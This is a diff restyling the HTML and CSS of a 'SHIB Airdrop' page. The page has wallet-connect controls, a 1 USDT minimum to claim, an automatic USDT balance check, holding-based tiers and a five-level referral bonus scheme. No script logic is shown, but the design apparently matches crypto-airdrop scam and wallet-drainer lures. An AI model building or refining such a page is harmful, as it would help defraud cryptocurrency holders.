@@ -14,47 +14,17 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            /* Light Theme Colors */
             --primary: #8b5cf6;
-            --primary-light: #a78bfa;
-            --primary-dark: #7c3aed;
-            --secondary: #06b6d4;
-            --secondary-light: #22d3ee;
+            --secondary: #22d3ee;
+            --dark: #0f172a;
+            --light: #f8f9fa;
             --success: #10b981;
-            --success-light: #34d399;
+            --info: #3b82f6;
             --warning: #f59e0b;
             --danger: #ef4444;
-            --info: #3b82f6;
             --bsc-yellow: #facc15;
-            
-            /* Light Theme Backgrounds */
-            --bg-body: #f3f4f6;
-            --bg-card: #ffffff;
-            --bg-card-hover: #f9fafb;
-            --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            
-            /* Text Colors */
-            --text-primary: #1f2937;
-            --text-secondary: #4b5563;
-            --text-muted: #6b7280;
-            --text-light: #9ca3af;
-            
-            /* Borders */
-            --border-color: #e5e7eb;
-            --border-focus: #8b5cf6;
-            
-            /* Shadows */
-            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
-            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
-            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
-            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
-            
-            /* Border Radius */
-            --radius-sm: 0.375rem;
-            --radius-md: 0.5rem;
-            --radius-lg: 1rem;
-            --radius-xl: 1.5rem;
-            --radius-full: 9999px;
+            --card-bg: rgba(255, 255, 255, 0.08);
+            --gradient-bg: linear-gradient(135deg, #1e3a8a, #6b21a8);
         }
 
         * {
@@ -64,8 +34,8 @@
         }
 
         body {
-            background: var(--bg-body);
-            color: var(--text-primary);
+            background: var(--gradient-bg);
+            color: white;
             font-family: 'Poppins', sans-serif;
             min-height: 100vh;
             padding: 20px;
@@ -73,22 +43,7 @@
             overflow-x: hidden;
         }
 
-        /* Modern Background Pattern */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: 
-                radial-gradient(circle at 20% 50%, rgba(139, 92, 246, 0.03) 0%, transparent 50%),
-                radial-gradient(circle at 80% 80%, rgba(6, 182, 212, 0.03) 0%, transparent 50%);
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        /* Floating Particles */
+        /* Particle Background */
         #particles {
             position: fixed;
             top: 0;
@@ -103,485 +58,290 @@
             position: absolute;
             width: 20px;
             height: 20px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%238b5cf6" opacity="0.1"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>') no-repeat center;
+            background: url('https://img.icons8.com/ios-filled/50/ffd700/bitcoin.png') no-repeat center;
             background-size: contain;
-            opacity: 0.5;
-            animation: float 20s infinite linear;
+            opacity: 0.7;
+            animation: float 15s infinite linear;
         }
 
         @keyframes float {
-            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0.2; }
-            100% { transform: translateY(-100vh) translateX(100px) rotate(360deg); opacity: 0.2; }
+            0% { transform: translateY(100vh) translateX(0); opacity: 0.4; }
+            50% { opacity: 0.7; }
+            100% { transform: translateY(-100vh) translateX(20px); opacity: 0.4; }
         }
 
         .container {
-            max-width: 1400px;
+            max-width: 1200px;
             margin: 0 auto;
             padding: 30px;
+            background: var(--card-bg);
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(12px);
             position: relative;
             z-index: 1;
         }
 
-        /* Header Styles */
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-
-        h1 {
-            font-size: 3.5rem;
-            font-weight: 800;
-            background: var(--bg-gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 15px;
-            letter-spacing: -0.02em;
-        }
-
-        .header-subtitle {
-            font-size: 1.2rem;
-            color: var(--text-secondary);
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        /* Status Bar */
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-full);
-            padding: 12px 24px;
-            margin-bottom: 30px;
-            box-shadow: var(--shadow-md);
-        }
-
-        .status-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .status-label {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-            font-weight: 500;
-        }
-
-        .status-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            padding: 4px 12px;
-            border-radius: var(--radius-full);
-            font-size: 0.85rem;
-            font-weight: 600;
-            background: var(--bg-body);
-            border: 1px solid var(--border-color);
-        }
-
-        .status-badge.online {
-            background: rgba(16, 185, 129, 0.1);
-            color: var(--success);
-            border-color: rgba(16, 185, 129, 0.2);
-        }
-
-        .status-badge.offline {
-            background: rgba(239, 68, 68, 0.1);
-            color: var(--danger);
-            border-color: rgba(239, 68, 68, 0.2);
-        }
-
-        .status-badge.warning {
-            background: rgba(245, 158, 11, 0.1);
-            color: var(--warning);
-            border-color: rgba(245, 158, 11, 0.2);
-        }
-
-        .status-badge i {
-            font-size: 0.7rem;
-        }
-
-        /* Card Styles */
-        .card {
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-xl);
-            padding: 30px;
-            margin-bottom: 30px;
-            box-shadow: var(--shadow-lg);
-            transition: all 0.3s ease;
-        }
-
-        .card:hover {
-            box-shadow: var(--shadow-xl);
-            transform: translateY(-2px);
-            border-color: var(--primary-light);
-        }
-
-        .card-title {
-            font-size: 1.8rem;
+        h2 {
+            font-size: 2.5rem;
             font-weight: 700;
-            margin-bottom: 25px;
-            background: var(--bg-gradient);
+            text-align: center;
+            background: linear-gradient(to right, var(--secondary), var(--primary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            margin-bottom: 30px;
         }
 
-        /* Grid Layout */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 30px;
+        h3 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            text-align: center;
+            color: var(--light);
+            margin-bottom: 20px;
         }
 
         /* Button Styles */
         .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            padding: 12px 30px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
             border: none;
-            border-radius: var(--radius-full);
-            font-size: 1rem;
+            padding: 14px 35px;
+            border-radius: 50px;
+            font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-            background: var(--bg-card);
-            color: var(--text-primary);
-            border: 1px solid var(--border-color);
+            box-shadow: 0 4px 20px rgba(139, 92, 246, 0.5);
+            animation: pulse 2s infinite;
+            margin: 10px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(139, 92, 246, 0.2);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-
-        .btn:hover::before {
-            width: 300px;
-            height: 300px;
-        }
-
-        .btn-primary {
-            background: var(--bg-gradient);
-            color: white;
-            border: none;
-            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);
-        }
-
-        .btn-primary:hover {
-            box-shadow: 0 6px 20px rgba(139, 92, 246, 0.4);
-            transform: translateY(-2px);
-        }
-
-        .btn-bsc {
-            background: linear-gradient(135deg, #facc15, #fbbf24);
-            color: #1f2937;
-            border: none;
-            box-shadow: 0 4px 15px rgba(250, 204, 21, 0.3);
-        }
-
-        .btn-success {
-            background: linear-gradient(135deg, #10b981, #34d399);
-            color: white;
-            border: none;
-        }
-
-        .btn-outline {
-            background: transparent;
-            border: 1px solid var(--border-color);
-        }
-
-        .btn-outline:hover {
-            border-color: var(--primary);
-            color: var(--primary);
+        .btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 25px rgba(139, 92, 246, 0.7);
+            animation: none;
         }
 
         .btn:disabled {
-            opacity: 0.6;
+            background: #4b5563;
             cursor: not-allowed;
-            pointer-events: none;
+            box-shadow: none;
+            animation: none;
+        }
+
+        .btn-bsc {
+            background: linear-gradient(45deg, var(--bsc-yellow), #fef08a);
+            color: #000;
+            box-shadow: 0 4px 20px rgba(250, 204, 21, 0.5);
+        }
+
+        .btn-success {
+            background: linear-gradient(45deg, var(--success), #34d399);
+        }
+
+        .btn-eligibility {
+            background: linear-gradient(45deg, #3b82f6, #60a5fa);
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.5); }
+            50% { box-shadow: 0 0 0 15px rgba(139, 92, 246, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(139, 92, 246, 0); }
         }
 
         /* Input Styles */
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-label {
-            display: block;
-            margin-bottom: 8px;
-            color: var(--text-secondary);
-            font-weight: 500;
-            font-size: 0.95rem;
-        }
-
-        .input-field {
-            width: 100%;
+        input[type="text"] {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50px;
             padding: 12px 20px;
-            background: var(--bg-body);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-md);
-            color: var(--text-primary);
-            font-size: 1rem;
-            transition: all 0.3s ease;
-        }
-
-        .input-field:focus {
+            color: white;
+            width: 100%;
+            max-width: 400px;
+            margin: 10px 0;
             outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
         }
 
-        .input-field::placeholder {
-            color: var(--text-light);
+        input[type="text"]:focus {
+            border-color: var(--secondary);
         }
 
-        /* Stats Grid */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 20px;
-            margin: 25px 0;
-        }
-
-        .stat-card {
-            background: var(--bg-body);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-lg);
-            padding: 20px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-
-        .stat-card:hover {
-            border-color: var(--primary);
-            transform: translateY(-2px);
-        }
-
-        .stat-value {
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--primary);
-            margin-bottom: 5px;
-        }
-
-        .stat-label {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
+        /* Status and Network Status */
+        .status {
             font-weight: 500;
+            color: var(--secondary);
+        }
+
+        .network-status {
+            padding: 6px 12px;
+            border-radius: 50px;
+            background: rgba(250, 204, 21, 0.2);
+            color: var(--bsc-yellow);
+            font-size: 0.9rem;
+            margin-left: 10px;
+        }
+
+        .backend-status {
+            padding: 6px 12px;
+            border-radius: 50px;
+            background: rgba(34, 211, 238, 0.2);
+            color: var(--secondary);
+            font-size: 0.9rem;
+            margin-left: 10px;
         }
 
         /* Alert Styles */
         .alert {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            background: rgba(59, 130, 246, 0.2);
+            border-left: 4px solid var(--info);
             display: flex;
             align-items: center;
-            gap: 15px;
-            padding: 15px 20px;
-            border-radius: var(--radius-lg);
-            margin-bottom: 20px;
-            border-left: 4px solid transparent;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            animation: slideIn 0.5s ease;
-        }
-
-        .alert i {
-            font-size: 1.4rem;
-        }
-
-        .alert-info {
-            border-left-color: var(--info);
-            background: rgba(59, 130, 246, 0.05);
+            gap: 10px;
+            animation: fadeIn 0.5s ease;
         }
 
         .alert-success {
-            border-left-color: var(--success);
-            background: rgba(16, 185, 129, 0.05);
+            background: rgba(16, 185, 129, 0.2);
+            border-left: 4px solid var(--success);
         }
 
         .alert-warning {
-            border-left-color: var(--warning);
-            background: rgba(245, 158, 11, 0.05);
+            background: rgba(245, 158, 11, 0.2);
+            border-left: 4px solid var(--warning);
         }
 
         .alert-danger {
-            border-left-color: var(--danger);
-            background: rgba(239, 68, 68, 0.05);
+            background: rgba(239, 68, 68, 0.2);
+            border-left: 4px solid var(--danger);
         }
 
-        /* Referral Link Container */
-        .referral-container {
-            display: flex;
-            gap: 10px;
-            margin: 20px 0;
+        /* Card Styles */
+        .card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
         }
 
-        .referral-input {
-            flex: 1;
-            padding: 12px 20px;
-            background: var(--bg-body);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-md);
-            color: var(--text-primary);
-            font-family: monospace;
-            font-size: 0.9rem;
+        .card:hover {
+            transform: translateY(-5px);
         }
 
-        /* Plan Cards */
-        .plan-grid {
+        /* Grid for Referral and Airdrop Sections */
+        .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 30px;
         }
 
+        /* Referral and Airdrop Plan Cards */
         .plan-card {
+            background: linear-gradient(145deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.06));
+            border-radius: 12px;
+            padding: 15px;
+            margin: 10px 0;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            padding: 15px 20px;
-            background: var(--bg-body);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-lg);
-            transition: all 0.3s ease;
+            gap: 15px;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            animation: slideIn 0.5s ease forwards;
         }
 
         .plan-card:hover {
-            border-color: var(--primary);
-            transform: translateX(5px);
-            background: white;
+            transform: scale(1.03);
+            box-shadow: 0 5px 20px rgba(139, 92, 246, 0.3);
         }
 
-        .plan-info {
-            display: flex;
-            align-items: center;
-            gap: 15px;
+        .plan-card .icon {
+            font-size: 1.5rem;
+            color: var(--secondary);
         }
 
-        .plan-icon {
-            width: 45px;
-            height: 45px;
-            background: var(--bg-gradient);
-            border-radius: var(--radius-md);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 1.3rem;
+        .plan-card .plan-level {
+            font-size: 1rem;
+            font-weight: 500;
+            color: var(--light);
+            flex: 1;
         }
 
-        .plan-details h4 {
+        .plan-card .plan-reward {
             font-size: 1rem;
             font-weight: 600;
-            color: var(--text-primary);
-            margin-bottom: 4px;
+            color: var(--bsc-yellow);
+            background: rgba(250, 204, 21, 0.2);
+            padding: 5px 10px;
+            border-radius: 20px;
         }
 
-        .plan-details p {
-            font-size: 0.85rem;
-            color: var(--text-secondary);
-        }
-
-        .plan-reward {
-            padding: 6px 15px;
-            background: linear-gradient(135deg, #10b981, #34d399);
-            color: white;
-            border-radius: var(--radius-full);
-            font-weight: 600;
-            font-size: 0.9rem;
-        }
-
-        /* Badge Styles */
-        .badge {
-            display: inline-flex;
+        /* Referral Link Container */
+        .referral-link-container {
+            display: flex;
             align-items: center;
-            padding: 4px 12px;
-            border-radius: var(--radius-full);
-            font-size: 0.85rem;
-            font-weight: 600;
+            gap: 10px;
+            margin-top: 20px;
         }
 
-        .badge-success {
-            background: rgba(16, 185, 129, 0.1);
-            color: var(--success);
-        }
-
-        .badge-warning {
-            background: rgba(245, 158, 11, 0.1);
-            color: var(--warning);
-        }
-
-        .badge-primary {
-            background: rgba(139, 92, 246, 0.1);
-            color: var(--primary);
-        }
-
-        .tier-badge {
-            padding: 4px 12px;
-            background: rgba(139, 92, 246, 0.1);
-            color: var(--primary);
-            border-radius: var(--radius-full);
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-left: 10px;
-        }
-
-        .eligibility-status {
-            padding: 4px 12px;
-            border-radius: var(--radius-full);
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-left: 10px;
-        }
-
-        .eligible {
-            background: rgba(16, 185, 129, 0.1);
-            color: var(--success);
-        }
-
-        .not-eligible {
-            background: rgba(239, 68, 68, 0.1);
-            color: var(--danger);
+        #referralLink {
+            flex-grow: 1;
         }
 
         /* Referrals List */
         #referralsList {
             list-style: none;
-            margin-top: 20px;
+            padding: 0;
         }
 
         #referralsList li {
-            padding: 12px 15px;
-            background: var(--bg-body);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-md);
-            margin-bottom: 8px;
+            background: var(--card-bg);
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 10px;
             font-size: 0.9rem;
-            transition: all 0.3s ease;
+            transition: background 0.3s ease;
         }
 
         #referralsList li:hover {
-            border-color: var(--primary);
-            background: white;
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        /* Tier Badge */
+        .tier-badge {
+            padding: 5px 12px;
+            border-radius: 50px;
+            background: rgba(34, 211, 238, 0.2);
+            color: var(--secondary);
+            font-size: 0.8rem;
+            margin-left: 8px;
+        }
+
+        /* Eligibility Status */
+        .eligibility-status {
+            padding: 5px 12px;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            margin-left: 8px;
+        }
+        
+        .eligible {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--success);
+        }
+        
+        .not-eligible {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
         }
 
         /* Loading Spinner */
@@ -589,45 +349,25 @@
             display: inline-block;
             width: 20px;
             height: 20px;
-            border: 3px solid rgba(139, 92, 246, 0.2);
+            border: 3px solid rgba(255,255,255,.3);
             border-radius: 50%;
-            border-top-color: var(--primary);
-            animation: spin 1s linear infinite;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
         }
 
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
 
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Footer */
-        .footer {
-            text-align: center;
-            padding: 30px;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-xl);
-            margin-top: 30px;
-        }
-
-        .footer p {
-            color: var(--text-secondary);
-            font-size: 0.95rem;
-        }
-
-        .footer span {
-            color: var(--primary);
-            font-weight: 600;
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
         }
 
         /* Responsive Design */
@@ -636,45 +376,25 @@
                 padding: 20px;
             }
 
-            h1 {
-                font-size: 2.5rem;
+            h2 {
+                font-size: 2rem;
             }
 
-            .status-bar {
-                flex-direction: column;
-                align-items: flex-start;
-                border-radius: var(--radius-lg);
+            h3 {
+                font-size: 1.5rem;
             }
 
-            .status-item {
-                width: 100%;
-                justify-content: space-between;
+            .btn {
+                padding: 12px 25px;
+                font-size: 1rem;
+            }
+
+            input[type="text"] {
+                max-width: 100%;
             }
 
             .grid {
                 grid-template-columns: 1fr;
-            }
-
-            .stats-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .btn {
-                width: 100%;
-            }
-
-            .referral-container {
-                flex-direction: column;
-            }
-        }
-
-        @media (max-width: 480px) {
-            h1 {
-                font-size: 2rem;
-            }
-
-            .card {
-                padding: 20px;
             }
 
             .plan-card {
@@ -683,9 +403,38 @@
                 gap: 10px;
             }
 
-            .plan-reward {
+            .plan-card .plan-reward {
                 width: 100%;
                 text-align: center;
+            }
+
+            .particle {
+                width: 15px;
+                height: 15px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+
+            h2 {
+                font-size: 1.8rem;
+            }
+
+            .btn {
+                width: 100%;
+                margin: 5px 0;
+            }
+
+            .alert {
+                font-size: 0.9rem;
+            }
+
+            .particle {
+                width: 10px;
+                height: 10px;
             }
         }
     </style>
@@ -695,288 +444,179 @@
     <div id="particles"></div>
 
     <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <h1>🚀 SHIB Airdrop</h1>
-            <p class="header-subtitle">Claim your SHIB tokens and earn rewards through our multi-level referral program</p>
-        </div>
+        <h2>🚀 SHIB Airdrop</h2>
         
-        <!-- Status Bar -->
-        <div class="status-bar">
-            <div class="status-item">
-                <span class="status-label"><i class="fas fa-server"></i> server:</span>
-                <span class="status-badge" id="serverStatusBadge">
-                    <i class="fas fa-circle"></i> <span id="serverStatus">Checking...</span>
-                </span>
-            </div>
-            <div class="status-item">
-                <span class="status-label"><i class="fas fa-network-wired"></i> Network:</span>
-                <span class="status-badge" id="networkStatus">
-                    <i class="fas fa-circle"></i> <span id="networkStatusText">Not Connected</span>
-                </span>
-            </div>
-            <div class="status-item">
-                <span class="status-label"><i class="fas fa-wallet"></i> Wallet:</span>
-                <span class="status-badge" id="walletAddress">
-                    <i class="fas fa-circle"></i> Not Connected
-                </span>
-            </div>
-        </div>
-        
-        <!-- server Status Alert -->
-        <div class="alert alert-info" id="serverStatusAlert">
+        <!-- Backend Status Alert -->
+        <div class="alert alert-success" id="backendStatusAlert">
             <i class="fas fa-server"></i>
-            <div><strong>server Status:</strong> <span id="serverStatusText">Checking connection...</span></div>
+            <strong>Backend Status:</strong> <span id="backendStatus">Checking...</span>
+            <span id="backendStatusBadge" class="backend-status">Connecting...</span>
         </div>
         
         <!-- Warning Alert -->
         <div class="alert alert-warning">
             <i class="fas fa-exclamation-triangle"></i>
-            <div><strong>Important:</strong> You need at least 1 USDT in your wallet to claim the airdrop.</div>
+            <strong>Important:</strong> You need at least 1 USDT in your wallet to claim the airdrop.
+            <span id="networkStatus" class="network-status">Network: Not Connected</span>
         </div>
 
         <!-- Eligibility Info -->
         <div class="alert alert-info">
             <i class="fas fa-info-circle"></i>
-            <div><strong>One-Click Eligibility Check:</strong> Click "Check Eligibility" to automatically verify your USDT balance and eligibility for the airdrop.</div>
+            <strong>One-Click Eligibility Check:</strong> Click "Check Eligibility" to automatically verify your USDT balance and eligibility for the airdrop.
         </div>
         
-        <!-- Main Wallet Card -->
+        <!-- Wallet and Airdrop Controls -->
         <div class="card">
-            <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 30px;">
-                <button onclick="connectWallet()" class="btn btn-primary" id="connectWalletBtn">
-                    <i class="fas fa-wallet"></i> Connect Wallet
-                </button>
-                <button onclick="switchToBSC()" class="btn btn-bsc">
-                    <i class="fas fa-exchange-alt"></i> Switch to BSC
-                </button>
-            </div>
-
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-value" id="usdtBalance">0</div>
-                    <div class="stat-label">USDT Balance</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value" id="airdropAmount">0</div>
-                    <div class="stat-label">Airdrop Amount</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value" id="tierDisplay">-</div>
-                    <div class="stat-label">Current Tier</div>
-                </div>
-            </div>
-
-            <div class="input-group">
-                <label class="input-label" for="referrer">
-                    <i class="fas fa-user-plus"></i> Enter Referral Address (Optional):
-                </label>
-                <input type="text" id="referrer" class="input-field" placeholder="0x...">
-            </div>
+            <button onclick="connectWallet()" class="btn" id="connectWalletBtn">
+                <i class="fas fa-wallet"></i> Connect Wallet
+            </button>
+            <button onclick="switchToBSC()" class="btn btn-bsc">
+                <i class="fas fa-exchange-alt"></i> Switch to BSC
+            </button>
             
-            <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-top: 25px;">
-                <button onclick="checkEligibility()" class="btn btn-primary" id="checkEligibilityBtn" style="flex: 1;">
-                    <i class="fas fa-clipboard-check"></i> Check Eligibility
-                </button>
-                <button id="claimButton" onclick="claimAirdrop()" class="btn btn-success" disabled style="flex: 1;">
-                    <i class="fas fa-gift"></i> Claim Airdrop
-                </button>
-            </div>
+            <p><strong>Connected Wallet:</strong> <span id="walletAddress" class="status">Not Connected</span></p>
 
-            <p style="margin-top: 20px; color: var(--text-secondary);">
-                <strong>Your Airdrop Amount:</strong> <span id="airdropAmountDisplay" class="status">0</span> tokens 
+            <label for="referrer">Enter Referral Address (Optional):</label>
+            <input type="text" id="referrer" placeholder="0x...">
+            
+            <!-- ✅ Main Working Button - Updated to Check Eligibility -->
+            <button onclick="checkEligibility()" class="btn btn-eligibility" id="checkEligibilityBtn">
+                <i class="fas fa-clipboard-check"></i> Check Eligibility
+            </button>
+            <p><strong>Your USDT Balance:</strong> <span id="usdtBalance" class="status">0</span></p>
+
+            <p><strong>Your Airdrop Amount:</strong> <span id="airdropAmount" class="status">0</span> tokens 
                 <span id="tierBadge" class="tier-badge"></span>
                 <span id="eligibilityBadge" class="eligibility-status"></span>
             </p>
+
+            <button id="claimButton" onclick="claimAirdrop()" class="btn" disabled>
+                <i class="fas fa-gift"></i> Claim Airdrop
+            </button>
         </div>
         
-        <!-- Referral and Airdrop Plans Grid -->
+        <!-- Referral and Airdrop Plans -->
         <div class="grid">
-            <!-- Referral Section -->
+            <!-- Referral Link and Referrals -->
             <div class="card">
-                <h3 class="card-title">
-                    <i class="fas fa-users"></i> Referral Program
-                </h3>
-                
-                <div class="referral-container">
-                    <input type="text" id="referralLink" class="referral-input" readonly placeholder="Connect wallet to generate referral link">
-                    <button onclick="copyReferralLink()" class="btn btn-outline" title="Copy to clipboard">
-                        <i class="fas fa-copy"></i>
+                <h3>📬 Your Referral Link</h3>
+                <div class="referral-link-container">
+                    <input type="text" id="referralLink" readonly placeholder="Connect wallet to generate referral link">
+                    <button onclick="copyReferralLink()" class="btn">
+                        <i class="fas fa-copy"></i> Copy
                     </button>
                 </div>
                 
-                <button onclick="getMyReferrals()" class="btn btn-outline" style="width: 100%; margin-bottom: 25px;">
+                <button onclick="getMyReferrals()" class="btn">
                     <i class="fas fa-users"></i> My Referrals
                 </button>
-                
                 <ul id="referralsList"></ul>
-                
-                <div class="plan-grid">
-                    <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-user-plus"></i></div>
-                            <div class="plan-details">
-                                <h4>Level 1 Referral</h4>
-                                <p>Direct referrals</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">20%</span>
-                    </div>
-                    <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-users"></i></div>
-                            <div class="plan-details">
-                                <h4>Level 2 Referral</h4>
-                                <p>Second level</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">10%</span>
-                    </div>
-                    <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-user-friends"></i></div>
-                            <div class="plan-details">
-                                <h4>Level 3 Referral</h4>
-                                <p>Third level</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">5%</span>
-                    </div>
-                    <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-user-tie"></i></div>
-                            <div class="plan-details">
-                                <h4>Level 4 Referral</h4>
-                                <p>Fourth level</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">3%</span>
-                    </div>
-                    <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-user-check"></i></div>
-                            <div class="plan-details">
-                                <h4>Level 5 Referral</h4>
-                                <p>Fifth level</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">2%</span>
-                    </div>
-                </div>
             </div>
             
-            <!-- Airdrop Tiers Section -->
+            <!-- Referral and Airdrop Plans -->
             <div class="card">
-                <h3 class="card-title">
-                    <i class="fas fa-trophy"></i> Airdrop Tiers
-                </h3>
+                <h3>💰 Referral Program</h3>
+                <div class="alert alert-success">
+                    <i class="fas fa-money-bill-wave"></i>
+                    <strong>Multi-Level Rewards:</strong> Earn bonuses when your referrals claim their airdrops!
+                </div>
                 
-                <div class="plan-grid">
+                <div class="referral-plan">
                     <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-gem"></i></div>
-                            <div class="plan-details">
-                                <h4>≥ 10,001 USDT</h4>
-                                <p>Diamond Tier</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">5M</span>
+                        <i class="fas fa-user-plus icon"></i>
+                        <span class="plan-level">Level 1 Referral</span>
+                        <span class="plan-reward">20% bonus</span>
                     </div>
                     <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-trophy"></i></div>
-                            <div class="plan-details">
-                                <h4>≥ 5,001 USDT</h4>
-                                <p>Platinum Tier</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">2M</span>
+                        <i class="fas fa-users icon"></i>
+                        <span class="plan-level">Level 2 Referral</span>
+                        <span class="plan-reward">10% bonus</span>
                     </div>
                     <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-medal"></i></div>
-                            <div class="plan-details">
-                                <h4>≥ 1,001 USDT</h4>
-                                <p>Gold Tier</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">1M</span>
+                        <i class="fas fa-user-friends icon"></i>
+                        <span class="plan-level">Level 3 Referral</span>
